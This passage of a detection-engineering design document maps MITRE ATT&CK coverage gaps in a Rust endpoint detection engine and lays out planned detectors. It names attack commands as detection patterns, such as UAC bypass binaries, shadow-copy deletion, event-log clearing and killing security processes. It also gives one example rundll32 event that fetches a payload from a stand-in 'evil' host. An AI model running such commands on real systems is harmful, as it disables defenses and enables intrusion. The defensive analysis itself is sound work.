  variants as "supported tactics" would overstate the engine's detection breadth.

### 7.3 Recommended Detector Additions

| ThreatClass | Proposed Detector | Minimum Viable Detection Logic |
|-------------|-------------------|-------------------------------|
| `PrivilegeEscalation` | `PrivilegeEscalationDetector` | Named pipe impersonation patterns, UAC bypass command sequences (`fodhelper`, `eventvwr`), `runas` with `/savecred`, service permission abuse via `sc sdset` |
| `Discovery` | `DiscoveryEnumerationDetector` | Burst detection of enumeration commands (`whoami /all`, `net group`, `nltest /dclist`, `systeminfo`, `ipconfig /all`) from a single host within a time window |
| `Impact` | `ImpactDetector` | Mass file rename/encrypt patterns (ransomware), `vssadmin delete shadows`, rapid service stop sequences, `bcdedit /set` safe boot modifications |
| `InitialAccess` | N/A (out of scope for endpoint detection) | Most Initial Access techniques occur at the network perimeter or via user interaction; endpoint detection is limited to post-exploitation artifacts |
| `DefenseEvasion` | `MasqueradingDetector` + reclassify existing detections | Process name vs. path mismatch detection; also reclassify `SupplyChainDetector` LOLBin findings to emit `DefenseEvasion` instead of or in addition to `SupplyChain` |

---

## 8. Detector Deconfliction

> **Added in v0.3** to document overlapping and inconsistent detection across
> multiple detectors.

### 8.1 LOLBin Classification Inconsistency

The `SupplyChainDetector` and `SuspiciousScriptingDetector` both detect
overlapping LOLBin abuse patterns but emit different `ThreatClass` values:

| LOLBin | Pattern | SupplyChainDetector | SuspiciousScriptingDetector |
|--------|---------|--------------------|-----------------------------|
| `certutil` | `-urlcache` with HTTP URL | `ThreatClass::SupplyChain` (T1218) | `ThreatClass::Execution` (LOLBin abuse) |
| `rundll32` | `javascript:` or HTTP URL | `ThreatClass::SupplyChain` (T1218.011) | `ThreatClass::Execution` (LOLBin abuse) |

**Problem:** A single telemetry event (e.g., `rundll32.exe javascript:https://evil/payload`)
dispatched through the `CompositeDetector` will produce **two findings** with
different threat classes (`SupplyChain` and `Execution`), different
`strategy_id` values, and different evidence structures for the same underlying
malicious action. This creates:

1. **Duplicate pheromone deposits** for two different threat classes, potentially
   triggering escalation in both `SupplyChain` and `Execution` concentration
   tracks simultaneously.
2. **Inconsistent ATT&CK classification** -- the same `rundll32 javascript:`
   pattern is T1218.011 (Signed Binary Proxy Execution, a Defense Evasion
   technique) from `SupplyChainDetector` but classified as `Execution` from
   `SuspiciousScriptingDetector`. Neither classification matches the canonical
   ATT&CK tactic mapping of T1218 to Defense Evasion.
3. **Alert fatigue** from duplicate findings for the same event.

**From the code:** In `supply_chain.rs` lines 143-184, the `certutil` and
`rundll32` checks are independent of and duplicative with the corresponding
checks in `suspicious_scripting.rs` lines 190-211 (`is_lolbin_abuse` function).
The `SupplyChainDetector` uses `normalize_process_name()` (strips path and
`.exe`) for an exact match, while `SuspiciousScriptingDetector` uses
`process_name.contains(lolbin)` for a substring match -- different matching
semantics producing different behavior for edge cases.

### 8.2 Severity Assignment Inconsistencies

Severity assignments vary across detectors without a documented severity model:

| Detector | Condition | Assigned Severity | Justification |
|----------|-----------|-------------------|---------------|
| `NetworkConnectDetector` | Suspicious port | `Medium` | Port alone is weak signal |
| `NetworkConnectDetector` | Beaconing detected | `High` | Periodic C2 is strong signal |
| `LateralMovementDetector` | Failed RDP brute-force | `Medium` | May be legitimate failed login |
| `LateralMovementDetector` | Unusual SSH | `High` | SSH from unexpected source |
| `CredentialAccessDetector` | LSASS access | `Critical` | LSASS access is almost always malicious |
| `CredentialAccessDetector` | SAM registry read | `High` | Could be legitimate admin |
| `PersistenceDetector` | Cron write (high signal) | `High` | `* * *` pattern |
| `PersistenceDetector` | Cron write (low signal) | `Medium` | Generic cron modification |

The gap is that there is no **written severity model** defining what
distinguishes `Medium` from `High` from `Critical` across detectors. Each
detector author appears to have applied ad hoc judgment. A formalized model
should define severity in terms of:
- **Confidence that the activity is malicious** (vs. potentially benign)
- **Blast radius if the activity succeeds** (single host vs. domain-wide)
- **Urgency of response** (can wait for analyst vs. requires immediate action)

### 8.3 Recommended Deconfliction Strategy

1. **Designate a primary detector** for each technique. For LOLBin abuse (T1218),
   `SuspiciousScriptingDetector` should be the primary detector and should emit
   `ThreatClass::DefenseEvasion` (the canonical ATT&CK tactic for T1218).
   `SupplyChainDetector` should remove the `certutil`/`rundll32` LOLBin checks
   and focus on its core domain: unsigned binaries in trusted paths and DLL
   sideloading.

2. **Implement finding deduplication** in the `CompositeDetector` or a
   post-processing layer. When multiple detectors produce findings for the same
   `event_id`, merge them into a single finding with the union of technique IDs
   and the maximum confidence/severity.

3. **Define and document a severity model** as a shared configuration contract
   consumed by all detectors. Consider a severity matrix:

   | Confidence >= 0.9 | Blast Radius: Host | Blast Radius: Domain |
   |-------------------|--------------------|---------------------|
   | True Positive Likely | High | Critical |
   | Possible True Positive | Medium | High |

---

## 9. Gap Prioritization Framework

### 9.1 Scoring Model

Each gap is scored on three axes (1-5 scale each):

| Axis | Definition | Weight |
|------|-----------|--------|
| **Prevalence (P)** | How frequently the technique appears in tracked intrusion sets and incident reports. Based on MITRE ATT&CK usage statistics and Red Canary top-techniques data. | 0.40 |
| **Impact (I)** | Severity of consequences if the technique succeeds undetected. Considers data loss potential, system compromise depth, and blast radius. | 0.35 |
| **Feasibility (F)** | How achievable detection is given the current telemetry surface, crate architecture, and expected implementation effort. Higher = easier to implement. | 0.25 |

**Composite score**: `S = (P * 0.40) + (I * 0.35) + (F * 0.25)`

Maximum possible score: 5.00. Minimum: 1.00.

### 9.2 Prioritized Gap Table

| Rank | Technique | ID | P | I | F | Score | Rationale |
|------|-----------|----|---|---|---|-------|-----------|
| 1 | Impair Defenses | T1562 | 5 | 5 | 3 | 4.50 | Attackers must disable defenses; high impact if blind; partially achievable with registry/process monitoring we already have. |
| 2 | Masquerading | T1036 | 5 | 4 | 4 | 4.40 | Directly undermines existing detectors; feasible using existing `ProcessStartEvent` fields (executable_path, signer). |
| 3 | Process Injection | T1055 | 5 | 5 | 2 | 4.25 | Ubiquitous in intrusions; completely invisible to current detectors; requires new telemetry payload variant. |
| 4 | Ingress Tool Transfer | T1105 | 5 | 3 | 4 | 4.05 | Very common; moderate impact (tool staging, not direct damage); feasible with process+file correlation. |
| 5 | Service Stop | T1489 | 3 | 5 | 4 | 3.95 | Ransomware precursor; high impact; straightforward process/service monitoring. |
| 6 | Obfuscated Files | T1027 | 5 | 4 | 2 | 3.90 | Nearly universal; current partial coverage is shallow; full coverage requires binary analysis capabilities. |
| 7 | Application Layer Protocol | T1071 | 5 | 4 | 2 | 3.90 | Dominant C2 channel; detection requires protocol-level inspection not currently available. |
| 8 | Indicator Removal | T1070 | 4 | 4 | 3 | 3.75 | Log clearing, timestomping; detectable via audit log events. |
| 9 | Token Manipulation | T1134 | 4 | 4 | 2 | 3.50 | Common privilege escalation; requires Windows token event telemetry. |
| 10 | Data Encrypted for Impact | T1486 | 3 | 5 | 2 | 3.45 | Ransomware payload; catastrophic impact; detection requires file I/O entropy analysis. |
| 11 | Create or Modify System Process | T1543 | 3 | 4 | 3 | 3.35 | Service persistence; moderate prevalence; achievable with service event telemetry. |
| 12 | System Discovery | T1082 / T1016 / T1049 | 4 | 2 | 4 | 3.30 | Common reconnaissance; low direct impact; feasible using process command-line patterns. |
| 13 | Account Discovery | T1087 | 4 | 2 | 4 | 3.30 | Common enumeration; low direct impact; detectable via `net user`, `net group`, LDAP query patterns. |
| 14 | Archive Collected Data | T1560 | 3 | 3 | 4 | 3.25 | Exfiltration staging; detectable via process patterns (rar, 7z, tar). |
| 15 | Screen Capture | T1113 | 2 | 2 | 2 | 2.00 | Lower priority; limited telemetry for detection. |

### 9.3 Score Distribution Analysis

- **Tier 1 (Score >= 4.0)**: Impair Defenses (4.50), Masquerading (4.40),
  Process Injection (4.25), Ingress Tool Transfer (4.05). These should be
  addressed in the next release cycle. Impair Defenses, Masquerading, and
  Ingress Tool Transfer can all be built on existing telemetry; Process
  Injection requires a new `MemoryOperation` payload variant.
- **Tier 2 (Score 3.5-3.99)**: Service Stop (3.95), Obfuscated Files (3.90),
  Application Layer Protocol (3.90), Indicator Removal (3.75), Token
  Manipulation (3.50). Target for v1.43.
- **Tier 3 (Score < 3.5)**: Data Encrypted for Impact (3.45), Create or Modify
  System Process (3.35), Discovery techniques (3.30), Archive Collected Data
  (3.25). Target for v1.44+.

---

## 10. Detector Roadmap

### 10.1 v1.42 -- Zero-New-Telemetry Detectors (Low-to-Medium Complexity)

These detectors can be built primarily with existing `TelemetryPayload` variants
and the established `DetectionStrategy` trait pattern. This milestone groups by
implementation feasibility rather than strictly by gap priority score: the
Discovery detector scores Tier 3 on priority but is included here because it
requires zero new telemetry and minimal implementation effort.

#### 10.1.1 MasqueradingDetector

**Complexity**: Low.
**New telemetry required**: None (uses existing `ProcessStartEvent` fields).
**Techniques covered**: T1036.001, T1036.003, T1036.005.
**Implementation sketch**:

- Maintain a map of `expected_process_name -> expected_paths[]` (e.g.,
  `svchost.exe -> [c:\windows\system32\]`).
- On `ProcessStart`, compare `process_name` against `executable_path`. Flag
  mismatches where a well-known system binary name is used from an unexpected
  location.
- Cross-reference `signer` and `signature_valid` to catch T1036.001 (invalid
  code signature on masqueraded binary).
- Emit `ThreatClass::DefenseEvasion`.

#### 10.1.2 DefenseImpairmentDetector

**Complexity**: Medium.
**New telemetry required**: Partial (process termination events would enhance
coverage; registry persistence events already exist).
**Techniques covered**: T1562.001, T1562.002, T1562.004.
**Implementation sketch**:

- Maintain a list of protected security process names (e.g., `MsMpEng.exe`,
  `CrowdStrike`, `elastic-agent`, `clamd`).
- Detect `ProcessStart` events that invoke `taskkill`, `sc stop`, or `net stop`
  targeting protected processes.
- Detect `RegistryPersistence` events writing to Windows Defender policy keys
  or audit policy keys.
- Emit `ThreatClass::DefenseEvasion`.

#### 10.1.3 IngressToolTransferDetector

**Complexity**: Low.
**New telemetry required**: None (uses existing `ProcessStartEvent`).
**Techniques covered**: T1105, T1197 (partial).
**Implementation sketch**:

- Detect `bitsadmin /transfer` with remote URLs.
- Detect `curl`/`wget` invocations downloading from external IPs/domains.
- Correlate with `SuspiciousScriptingDetector` for certutil and PowerShell
  download patterns (deduplication via `finding_id` namespacing).
- Emit `ThreatClass::CommandAndControl` or `ThreatClass::Execution` depending
  on context.

#### 10.1.4 DiscoveryEnumerationDetector

**Complexity**: Low.
**New telemetry required**: None (uses existing `ProcessStartEvent`).
**Techniques covered**: T1082, T1016, T1049, T1087, T1069, T1018.
**Implementation sketch**:

- Maintain a list of discovery commands: `whoami`, `ipconfig`, `ifconfig`,
  `net user`, `net group`, `net localgroup`, `nltest`, `arp -a`, `netstat`,
  `systeminfo`, `hostname`, `tasklist`, `query user`, `nslookup`, `wmic os`,
  `cat /etc/passwd` (Linux discovery).
- Use burst detection (similar to DNS burst logic): N discovery commands from
  the same host within a window triggers a finding.
- Individual high-signal commands (e.g., `nltest /dclist` or
  `net group "Domain Admins" /domain`) trigger immediately.
- Emit `ThreatClass::Discovery`.

### 10.2 v1.43 -- Tier 2 Detectors (Medium Complexity)

#### 10.2.1 ProcessInjectionDetector

**Complexity**: High.
**New telemetry required**: Yes -- new `TelemetryPayload::MemoryOperation` variant
for cross-process memory write and remote thread creation events.
**Techniques covered**: T1055.001 (DLL Injection), T1055.002 (PE Injection),
T1055.003 (Thread Execution Hijacking), T1055.012 (Process Hollowing).
**Implementation sketch**:

- Ingest `MemoryOperation` events containing source PID, target PID, operation
  type (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, etc.).
- Flag cross-process operations where source and target are different processes
  and the target is a known legitimate process.
- Correlate with process ancestry to suppress benign injection (e.g., debuggers,
  runtime instrumentation).
- Emit `ThreatClass::DefenseEvasion` and `ThreatClass::PrivilegeEscalation`.

#### 10.2.2 ImpactDetector

**Complexity**: Medium.
**New telemetry required**: Partial -- service state change events and high-rate
file modification events.
**Techniques covered**: T1489, T1486 (partial), T1490.
**Implementation sketch**:

- Detect `sc stop`, `taskkill /f`, `net stop` targeting critical services
  (databases, backup agents, VSS).
- Detect rapid sequential file modification patterns consistent with ransomware
  (high-entropy file writes across multiple directories in short time windows).
- Detect deletion of volume shadow copies (`vssadmin delete shadows`).
- Emit `ThreatClass::Impact`.

#### 10.2.3 IndicatorRemovalDetector

**Complexity**: Medium.
**New telemetry required**: Audit log events, file deletion events.
**Techniques covered**: T1070.001 (Clear Windows Event Logs), T1070.004 (File
Deletion), T1070.006 (Timestomp).
**Implementation sketch**:

- Detect `wevtutil cl`, `Clear-EventLog`, or Event ID 1102 (log cleared) patterns.
- Detect bulk file deletion in sensitive directories.
- Detect timestomp patterns (file modification time significantly earlier than
  creation time).
- Emit `ThreatClass::DefenseEvasion`.

### 10.3 v1.44+ -- Tier 3 Detectors (High Complexity)

#### 10.3.1 ObfuscationAnalysisDetector

**Complexity**: High.
**New telemetry required**: File content entropy, PE header metadata.
**Techniques covered**: T1027.002, T1027.004, T1027.010, T1140.
**Implementation sketch**:

- Shannon entropy analysis of file content (reuse algorithm from
  `DnsExfiltrationDetector`).
- PE header anomaly detection (section name randomization, unusual entry points,
  high-entropy sections).
- Command-line deobfuscation preprocessor for cmd.exe and PowerShell.

#### 10.3.2 ProtocolAnalysisDetector

**Complexity**: High.
**New telemetry required**: HTTP metadata (headers, URI, payload sizes),
TLS handshake metadata (JA3).
**Techniques covered**: T1071.001, T1071.002, T1573.001, T1573.002.
**Implementation sketch**:

- JA3/JA3S fingerprint matching against known C2 frameworks.
- HTTP header anomaly scoring.
- Request/response size distribution analysis for beaconing patterns.

---

## 11. Coverage Improvement Targets

### 11.1 Release Targets

| Milestone | Target Techniques (Full + Partial) | Top-20 Coverage | Notes |
|-----------|------------------------------------|-----------------|-------|
| Current (v1.39) | ~35 | ~40% (8/20) | Baseline from this analysis. |
| v1.42 | ~45 | ~55% (11/20) | Masquerading, defense impairment, tool transfer, discovery. |
| v1.43 | ~52 | ~65% (13/20) | Process injection, impact, indicator removal. |
| v1.44 | ~58 | ~75% (15/20) | Obfuscation analysis, protocol analysis, collection. |

### 11.2 Top-20 Technique Coverage Checklist

Based on Red Canary 2025 Threat Detection Report and MITRE ATT&CK usage statistics,
these are the 20 most commonly observed techniques in enterprise intrusions:

| # | Technique | ID | Current | v1.42 Target | v1.43 Target |
|---|----------|-----|---------|--------------|--------------|
| 1 | Command and Scripting Interpreter | T1059 | Partial | Partial | Partial |
| 2 | Process Injection | T1055 | None | None | Full |
| 3 | Obfuscated Files or Information | T1027 | Partial | Partial | Partial |
| 4 | Masquerading | T1036 | None | Full | Full |
| 5 | Impair Defenses | T1562 | None | Full | Full |
| 6 | Ingress Tool Transfer | T1105 | Partial | Full | Full |
| 7 | OS Credential Dumping | T1003 | Partial | Partial | Partial |
| 8 | Signed Binary Proxy Execution | T1218 | Full | Full | Full |
| 9 | Windows Management Instrumentation | T1047 | Full | Full | Full |
| 10 | Remote Services | T1021 | Full | Full | Full |
| 11 | Scheduled Task/Job | T1053 | Full | Full | Full |
| 12 | Boot or Logon Autostart Execution | T1547 | Partial | Partial | Full |
| 13 | Application Layer Protocol | T1071 | Partial | Partial | Partial |
| 14 | Non-Standard Port | T1571 | Full | Full | Full |
| 15 | System Information Discovery | T1082 | None | Full | Full |
| 16 | Account Discovery | T1087 | None | Full | Full |
| 17 | Data Encrypted for Impact | T1486 | None | None | Partial |
| 18 | Service Stop | T1489 | None | None | Full |
| 19 | Indicator Removal | T1070 | None | None | Full |
| 20 | Create or Modify System Process | T1543 | None | None | Partial |

### 11.3 Tactic-Level Targets

| Tactic | Current Coverage | v1.42 Target | v1.43 Target |
|--------|-----------------|--------------|--------------|
| Initial Access | ~22% | ~22% | ~33% |
| Execution | ~50% | ~58% | ~67% |
| Persistence | ~26% | ~32% | ~37% |
| Privilege Escalation | ~8% | ~8% | ~23% |
| Defense Evasion | ~19% | ~31% | ~36% |
| Credential Access | ~25% | ~25% | ~31% |
| Discovery | 0% | ~21% | ~24% |
| Lateral Movement | ~56% | ~56% | ~67% |
| Collection | 0% | 0% | ~12% |
| Command and Control | ~19% | ~25% | ~31% |
| Exfiltration | ~22% | ~22% | ~33% |
| Impact | 0% | 0% | ~23% |

---

## 12. Telemetry Requirements

> **Note (v0.3):** Section 6 (Structural Detectability Gaps) provides a
> complementary analysis of which technique families are architecturally
> impossible to detect without telemetry schema expansion. The phased
> expansion strategy below should be read in conjunction with that section's
> quantified coverage impact analysis.

Detection capabilities are fundamentally constrained by the telemetry surface.
The current `TelemetryPayload` enum in `crates/swarm-core/src/telemetry.rs`
provides seven payload variants:

| Variant | Source | Detectors Using It |
|---------|--------|--------------------|
| `ProcessStart` | eBPF / Sysmon | SuspiciousProcessTree, SuspiciousScripting, LateralMovement, SupplyChain |
| `NetworkConnect` | eBPF / netflow | NetworkConnect |
| `DnsQuery` | DNS tap / eBPF | DnsExfiltration |
| `RegistryAccess` | Sysmon / ETW | CredentialAccess |
| `RegistryPersistence` | Sysmon / ETW | Persistence |
| `FilePersistence` | eBPF / Sysmon | Persistence, SupplyChain |
| `AuthenticationEvent` | Windows Security / PAM | CredentialAccess, LateralMovement |

### 12.1 New Telemetry Payload Variants Needed

To reach the v1.43 coverage targets, the following new payload variants are
recommended:

| Proposed Variant | Required For | Priority | Data Sources |
|------------------|-------------|----------|--------------|
| `MemoryOperation` | T1055 (Process Injection) | High | eBPF (bpf_probe_write_user), Sysmon Event ID 8/10, ETW |
| `ServiceStateChange` | T1489 (Service Stop), T1543 (Create/Modify Service), T1562 (Impair Defenses) | High | SCM events, systemd journal, launchd |
| `FileOperation` | T1070 (Indicator Removal), T1486 (Data Encrypted for Impact), T1560 (Archive) | Medium | eBPF (vfs_write/unlink), Sysmon Event IDs 11/23/26 |
| `AuditLogEvent` | T1562.002 (Disable Event Logging), T1070.001 (Clear Logs) | Medium | Windows Event ID 1102, audit.log |
| `HttpMetadata` | T1071.001 (Web Protocols), T1105 (Ingress Tool Transfer) | Medium | eBPF TLS inspection, proxy logs, Zeek |
| `TlsHandshake` | T1573 (Encrypted Channel), T1071.001 (JA3 fingerprinting) | Low | eBPF, Zeek, proxy termination |

### 12.2 Telemetry Variant to Technique Gap Map

The following table shows which uncovered techniques become detectable with
each new telemetry variant:

| Telemetry Variant | Techniques Unlocked | Count |
|-------------------|-------------------|-------|
| `MemoryOperation` | T1055.001, T1055.002, T1055.003, T1055.012, T1134 (partial) | 5 |
| `ServiceStateChange` | T1489, T1543.003, T1543.002, T1562.001 (partial) | 4 |
| `FileOperation` | T1070.004, T1486 (partial), T1560, T1027.002 (partial) | 4 |
| `AuditLogEvent` | T1070.001, T1562.002 | 2 |
| `HttpMetadata` | T1071.001, T1071.002, T1105 (enhanced) | 3 |
| `TlsHandshake` | T1573.001, T1573.002 | 2 |

### 12.3 Zero-New-Telemetry Wins

Several high-value detections can be implemented using ONLY the existing
telemetry surface:

| Technique | ID | Existing Variant | Detection Approach |
|-----------|-----|-----------------|-------------------|
| Masquerading | T1036 | `ProcessStart` | Process name vs. executable_path mismatch. |
| Discovery Enumeration | T1082/T1087 | `ProcessStart` | Command-line pattern matching for discovery tools. |
| Ingress Tool Transfer | T1105 | `ProcessStart` | bitsadmin/curl/wget command-line patterns. |
| Defense Impairment | T1562 | `ProcessStart` + `RegistryPersistence` | taskkill/sc stop targeting security processes; registry writes to Defender policy keys. |
| AMSI Bypass | T1562.001 | `ProcessStart` | PowerShell command-line patterns targeting `System.Management.Automation.AmsiUtils`. |

These represent the highest-ROI detection improvements available today and
should be the starting point for v1.42 development.

---

## 13. Open Questions and Future Work

### 13.1 Cross-Detector Correlation at the Technique Level

The `CompositeDetector` currently merges findings from all strategies but does
not perform cross-strategy correlation. A technique like T1059.001 (PowerShell)
may produce findings from both `SuspiciousProcessTreeDetector` (parent-child)
and `SuspiciousScriptingDetector` (command-line content). Should these be
deduplicated, merged, or scored as compound evidence?

Proposal: Introduce a `CorrelationEngine` layer between the `CompositeDetector`
and the pheromone deposit path that:
- Groups findings by `event_id` and merges overlapping technique mappings.
- Boosts confidence when multiple independent strategies agree.
- Tags findings with all applicable technique IDs.

### 13.2 Sub-Technique Granularity in Evidence Payloads

Currently, only `PersistenceDetector` and `SupplyChainDetector` include explicit
`mitre_technique_id` fields in their evidence JSON. All detectors should be
updated to include this field, enabling:
- Automated coverage reporting from production finding data.
- MITRE ATT&CK Navigator layer generation from live deployment telemetry.
- Compliance reporting against frameworks that reference ATT&CK (e.g., NIST
  SP 800-53 mapping).

### 13.3 Confidence Calibration Against Real-World Data

The current confidence thresholds (0.9 high, 0.7 medium) are uniform across all
detectors. In practice, the base rate for different techniques varies dramatically.
A `T1003.001` (LSASS access) finding at 0.9 confidence has very different
precision than a `T1082` (System Discovery via `systeminfo`) finding at 0.9
confidence, because legitimate LSASS access is far rarer than legitimate
`systeminfo` invocation.

Research direction: Bayesian calibration using labeled datasets to set
per-technique prior probabilities and adjust confidence scores accordingly.

### 13.4 ATT&CK Coverage as a Runtime Metric

Proposal: Expose the ATT&CK coverage matrix as a runtime-queryable capability
of the swarm. Each detector should report its technique coverage at registration
time, and the `CompositeDetector` should maintain an aggregate coverage map.
This enables:
- Operators to understand their detection posture in real time.
- Gap-aware detection strategy evolution (new strategies preferentially target
  uncovered techniques).
- Integration with MITRE ATT&CK Evaluations reporting.

### 13.5 Threat-Intel-Driven Coverage Prioritization

The `ThreatIntelEntry` type in `crates/swarm-core/src/pheromone.rs` supports
operator-seeded threat intelligence (IP addresses, domains, file hashes). This
could be extended to include ATT&CK technique IDs associated with active
threat campaigns, dynamically reprioritizing which detectors are most critical
based on the current threat landscape.

### 13.6 Linux and macOS Coverage Parity

The current detector suite is heavily Windows-focused. While `PersistenceDetector`
covers cron and systemd timers, most other detectors rely on Windows-specific
indicators (LSASS, SAM registry, Run keys, LOLBins like certutil/mshta).
Achieving cross-platform parity requires:
- Linux LOLBin detection (python, perl, nc, socat, openssl as data transfer).
- macOS LaunchAgent/LaunchDaemon persistence (T1543.001, T1543.004).
- Linux credential access (T1003.008: /etc/shadow, T1552.004: SSH keys).
- Linux privilege escalation (T1548.001: setuid/setgid).

### 13.7 Automated Coverage Regression Testing

As detectors are added and modified, coverage regressions are possible (e.g., a
refactor might change indicator matching behavior and silently drop a technique).
Proposal: A coverage test suite that:
- Defines at least one synthetic telemetry event per covered technique.
- Asserts that the expected `ThreatClass` and technique ID are produced.
- Runs in CI alongside `cargo test`.
- Reports coverage delta against the matrix defined in this document.

---

## Cross-References

This document is part 2 of 8 in the **Swarm Hardening** research series.

| Doc | Title | Relevance to This Document |
|-----|-------|---------------------------|
| [01](./01-ADVERSARIAL-EVASION-AND-DETECTION-ROBUSTNESS.md) | Adversarial Evasion and Detection Robustness | Analyzes adversary evasion techniques that exploit the detection gaps identified in Sections 5.2 (obfuscation), 5.4 (masquerading), and 5.1 (process injection). Section 9 (Fileless and Memory-Only Evasion) provides adversary-perspective analysis of the structural telemetry gaps documented in Section 6 of this document. |
| [05](./05-KILL-CHAIN-RECONSTRUCTION-AND-GRAPH-CORRELATION.md) | Kill Chain Reconstruction and Graph Correlation | Maps the ATT&CK technique coverage from Section 3 to Cyber Kill Chain phases, identifying which kill chain stages lack detection depth. |
| [06](./06-BEHAVIORAL-BASELINE-AND-ANOMALY-DETECTION.md) | Behavioral Baseline and Anomaly Detection | Addresses the statistical baseline models needed for anomaly-based detection of Discovery enumeration (Section 10.1.4), beaconing (Section 3.8), and DNS burst patterns (Section 3.4). |

### Related Documents Outside This Series

| Doc | Series | Relevance |
|-----|--------|-----------|
| [sentinel-convergence/02](../sentinel-convergence/02-PREDICTIVE-FAILURE-AS-THREAT-SIGNAL.md) | Sentinel Convergence | Infrastructure anomaly detection proposed there would add coverage for T1496 (Resource Hijacking) and T1499 (Endpoint Denial of Service) -- two Impact-tactic gaps identified in Section 4.2. |
| [sentinel-convergence/05](../sentinel-convergence/05-TELEMETRY-BRIDGE-ARCHITECTURE.md) | Sentinel Convergence | Telemetry bridge architecture defines the transport layer for the new telemetry variants proposed in Section 12.1. |
| [sentinel-convergence/03](../sentinel-convergence/03-EDGE-NATIVE-SECURITY-DETECTION.md) | Sentinel Convergence | Edge deployment constraints affect which detectors from the roadmap (Section 10) are viable on resource-constrained nodes. |

---

## References

### Source Code References

- `crates/swarm-whisker/src/detector.rs` -- `DetectionStrategy` trait, `SuspiciousProcessTreeDetector`, `DetectionFinding`
- `crates/swarm-whisker/src/suspicious_scripting.rs` -- `SuspiciousScriptingDetector`, LOLBin detection, encoded command heuristics
- `crates/swarm-whisker/src/credential_access.rs` -- `CredentialAccessDetector`, LSASS/SAM/Kerberoasting detection
- `crates/swarm-whisker/src/dns_exfiltration.rs` -- `DnsExfiltrationDetector`, Shannon entropy, tunneling pattern detection
- `crates/swarm-whisker/src/lateral_movement.rs` -- `LateralMovementDetector`, WMI/PsExec/SSH/RDP detection
- `crates/swarm-whisker/src/persistence.rs` -- `PersistenceDetector`, registry Run keys, cron, systemd timers, scheduled tasks
- `crates/swarm-whisker/src/supply_chain.rs` -- `SupplyChainDetector`, code signing validation, DLL sideloading, signed binary abuse
- `crates/swarm-whisker/src/network_connect.rs` -- `NetworkConnectDetector`, beaconing analysis, suspicious port detection
- `crates/swarm-whisker/src/composite.rs` -- `CompositeDetector`, multi-strategy dispatch
- `crates/swarm-whisker/src/stream.rs` -- Stream processing runtime, `evaluate_event`, `findings_to_deposits`
- `crates/swarm-whisker/src/lib.rs` -- Module re-exports, `ProfileValidationError`, confidence threshold validation
- `crates/swarm-core/src/pheromone.rs` -- `ThreatClass` enum, `PheromoneDeposit`, `ThreatIntelEntry`
- `crates/swarm-core/src/types.rs` -- `Severity` enum, `ResponseAction`, `SwarmAction`
- `crates/swarm-core/src/telemetry.rs` -- `TelemetryEvent`, `TelemetryPayload` variants

### MITRE ATT&CK References

1. MITRE ATT&CK Enterprise Matrix v15. https://attack.mitre.org/matrices/enterprise/
2. MITRE ATT&CK Technique Usage Statistics. https://attack.mitre.org/resources/sightings/
3. MITRE ATT&CK Navigator. https://mitre-attack.github.io/attack-navigator/

### Industry Reports

4. Red Canary. "2025 Threat Detection Report." Red Canary, 2025. https://redcanary.com/threat-detection-report/
5. Red Canary. "2024 Threat Detection Report." Red Canary, 2024. https://redcanary.com/threat-detection-report/2024/
6. CISA. "Top Routinely Exploited Vulnerabilities." Cybersecurity Advisory AA24-317A, 2024. https://www.cisa.gov/news-events/cybersecurity-advisories
7. Mandiant. "M-Trends 2025." Google Cloud / Mandiant, 2025. https://www.mandiant.com/m-trends

### Academic and Technical References

8. Strom, B.E., et al. "MITRE ATT&CK: Design and Philosophy." MITRE Technical Report MTR190060, 2020.
9. Hutchins, E.M., Cloppert, M.J., and Amin, R.M. "Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains." Lockheed Martin, 2011.
10. Debar, H., Dacier, M., and Wespi, A. "A revised taxonomy for intrusion-detection systems." Annales des Telecommunications 55(7-8), 2000.
